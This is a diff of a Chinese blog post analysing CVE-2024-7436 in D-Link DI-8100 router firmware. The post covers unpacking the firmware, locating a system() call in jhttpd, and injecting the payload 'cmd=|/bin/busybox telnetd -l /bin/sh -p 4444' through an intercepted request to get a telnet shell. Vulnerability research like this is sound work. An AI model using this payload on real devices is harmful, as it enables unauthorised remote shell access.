@@ -6,6 +6,8 @@
     <content><![CDATA[<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>下载固件后使用binwalk解包</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">binwalk -Me DI_8100-16.07.26A1.zip</span><br></pre></td></tr></table></figure>
 
+<span id="more"></span>
+
 <p><img src="/img/cve-2024-7436/01.png"></p>
 <p>进入解包后的目录</p>
 <p>使用</p>
@@ -14,7 +16,7 @@
 <p>查找到jhttpd文件</p>
 <p><img src="/img/cve-2024-7436/02.png"></p>
 <p>分析与jhttpd有关的rc</p>
-<p>根据别人写的cve也是成功找到危险函数system</p>
+<p>根据漏洞信息报告找到危险函数 system</p>
 <p><img src="/img/cve-2024-7436/03.png"></p>
 <p>执行v10，v10由v28而来</p>
 <p><img src="/img/cve-2024-7436/04.png"></p>
@@ -34,12 +36,14 @@
 <p><img src="/img/cve-2024-7436/08.png"></p>
 <p>进入到路由器管理页面（账号密码依旧丰富的经验，但也可以找到）</p>
 <p><img src="/img/cve-2024-7436/09.png"></p>
-<p>然后用bp拦截改数据flag&#x3D;cmd&amp;cmd&#x3D;|&#x2F;bin&#x2F;busybox%20telnetd%20-l%20&#x2F;bin&#x2F;sh%20-p%204444</p>
+<p>然后用bp拦截改数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag=cmd&amp;cmd=|/bin/busybox%20telnetd%20-l%20/bin/sh%20-p%204444</span><br></pre></td></tr></table></figure>
+
 <p>发送</p>
 <p><img src="/img/cve-2024-7436/10.png"></p>
 <h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>查看固件的busybox</p>
 <p><img src="/img/cve-2024-7436/11.png"></p>
-<p>有telentd可以反弹shell</p>
+<p>有telnetd可以反弹shell</p>
 <p><img src="/img/cve-2024-7436/12.png"></p>
 ]]></content>
       <categories>
